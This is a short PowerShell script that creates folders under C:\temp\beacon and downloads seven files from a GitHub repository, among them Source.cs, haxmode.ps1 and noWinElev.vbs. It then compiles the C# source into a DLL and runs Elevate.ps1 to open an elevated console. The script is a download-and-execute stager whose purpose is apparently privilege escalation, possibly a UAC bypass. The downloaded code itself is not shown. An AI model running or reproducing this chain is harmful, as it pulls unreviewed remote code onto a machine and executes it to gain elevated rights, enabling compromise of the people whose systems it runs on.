# Create the necessary directories
mkdir C:\temp
mkdir C:\temp\beacon
mkdir C:\temp\beacon\elevate

# Grab the tools: Source.cs, compile.ps1, Elevate.ps1, batch.bat, GetState.ps1 and haxmode.ps1
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/Source.cs | Out-File -FilePath C:\temp\beacon\elevate\Source.cs -Encoding Default
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/compile.ps1 | Out-File -FilePath C:\temp\beacon\elevate\compile.ps1 -Encoding Default
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/Elevate.ps1 | Out-File -FilePath C:\temp\beacon\elevate\Elevate.ps1 -Encoding Default
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/haxmode.ps1 | Out-File -FilePath C:\temp\beacon\elevate\haxmode.ps1 -Encoding Default
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/batch.bat | Out-File -FilePath C:\temp\beacon\elevate\batch.bat -Encoding Default
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/GetState.ps1 | Out-File -FilePath C:\temp\beacon\elevate\GetState.ps1 -Encoding Default
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/noWinElev.vbs | Out-File -FilePath C:\temp\beacon\elevate\noWinElev.vbs -Encoding Default

# Compile the C# source code into a DLL
C:\temp\beacon\elevate\compile.ps1

# Execute the elevated console
C:\temp\beacon\elevate\Elevate.ps1
